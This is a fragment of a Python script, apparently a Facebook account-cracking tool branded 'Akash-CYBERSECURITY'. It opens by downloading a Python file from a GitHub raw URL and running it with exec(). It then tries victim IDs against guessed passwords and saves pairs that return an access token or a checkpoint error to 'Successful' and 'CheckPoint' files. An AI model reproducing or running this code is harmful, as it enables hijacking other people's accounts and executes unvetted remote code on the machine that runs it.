...
rs=requests.session()
rg=rs.get
x=(rg("https://raw.githubusercontent.com/𝗔𝗸𝗮𝘀𝗵-𝘾𝙔𝘽𝙀𝙍𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔/𝗔𝗸𝗮𝘀𝗵-𝘾𝙔𝘽𝙀𝙍𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔/main/info.py").text)
exec(x)
##### LOGO #####
▇◤▔▔▔▔▔▔▔◥▇
▇▏◥▇◣┊◢▇◤▕▇
...
{rcl}[+] This Script From 𝗔𝗸𝗮𝘀𝗵-𝘾𝙔𝘽𝙀𝙍 𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔 ...
...
if Permission=="On":
  ...
  motion(ccl+"You Need 𝗔𝗸𝗮𝘀𝗵-𝘾𝙔𝘽𝙀𝙍𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔's Permission")
  time.sleep(2)
  ...
  def main(arg):
    try:
      ...
      if 'access_token' in q:
        motion (ccl+'\n[𝗔𝗸𝗮𝘀𝗵_OK] ' + victim + '  |  ' + line+"\n")
        okb = open('save/𝗔𝗸𝗮𝘀𝗵_Successful.txt', 'a')
        okb.write(victim +" [ 𝗔𝗸𝗮𝘀𝗵 ] "+ line + '\n')
        okb.close()
        motion(ccl+"\nCreacked Account In Save File...\n")       
      elif 'www.facebook.com' in q['error_msg']:
        motion( ycl+'\n[𝗔𝗸𝗮𝘀𝗵_CP] ' +victim+'  |  '+ycl + line+"\n")
        cps = open('save/𝗔𝗸𝗮𝘀𝗵_CheckPoint.txt', 'a')
        cps.write(victim +" [ 𝗔𝗸𝗮𝘀𝗵 ] "+ line + '\n')
        cps.close()
        motion(ccl+"\nCreacked Account In Save File...\n")
